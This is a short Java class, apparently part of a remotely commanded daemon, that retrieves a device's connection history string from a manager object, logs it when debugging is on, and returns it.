package com.fx.maind.command.processor;

import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.logger.FxLog;
import com.fx.maind.ref.Customization;

public class RemoteGetConnectionHistoryStringProcessor {
	private static final String TAG = "RemoteGetConnectionHistoryStringProcessor";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;

	private AppEngine mAppEngine;
	
	public RemoteGetConnectionHistoryStringProcessor(AppEngine appEngine) {
		mAppEngine = appEngine;
	}
	
	public String process() {
		if (LOGV) FxLog.v(TAG, "process # ENTER ...");
		
		ConnectionHistoryManager connectionHistoryManager = mAppEngine.getConnectionHistoryManager();
		String connectionHistoryString = connectionHistoryManager.getAllHistory();
		if (LOGV) FxLog.v(TAG, "process # connectionHistoryString : " + connectionHistoryString);
		if (LOGV) FxLog.v(TAG, "process # EXIT ...");
		return connectionHistoryString;
	}

}
